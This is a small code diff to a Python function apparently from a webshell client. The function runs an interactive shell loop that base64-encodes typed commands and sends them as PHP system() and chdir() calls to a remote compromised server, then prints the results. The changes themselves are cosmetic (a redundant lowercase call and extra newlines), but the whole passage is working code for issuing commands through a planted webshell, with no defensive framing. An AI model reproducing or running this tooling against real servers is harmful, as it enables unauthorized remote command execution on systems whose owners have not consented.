@@ -14,7 +14,7 @@ def run():
     while gget("loop"):
         data = input(f"[{cwd}] $ ")
         lower_data = data.lower()
-        if (lower_data in ['exit', 'quit', 'back']):
+        if (lower_data.lower() in ['exit', 'quit', 'back']):
             break
         data = base64_encode(data)
         if (lower_data.startswith("cd ") and len(lower_data) > 3):
@@ -22,5 +22,5 @@ def run():
             cwd = send(f'chdir(\'{cwd}\');chdir(\'{path}\');print(getcwd());').r_text.strip()
         else:
             res = send(f'chdir(\'{cwd}\');system(base64_decode(\'{data}\'));')
-            print(res.r_text.strip())
+            print("\n" + res.r_text.strip() + "\n")
     set_namespace("webshell")
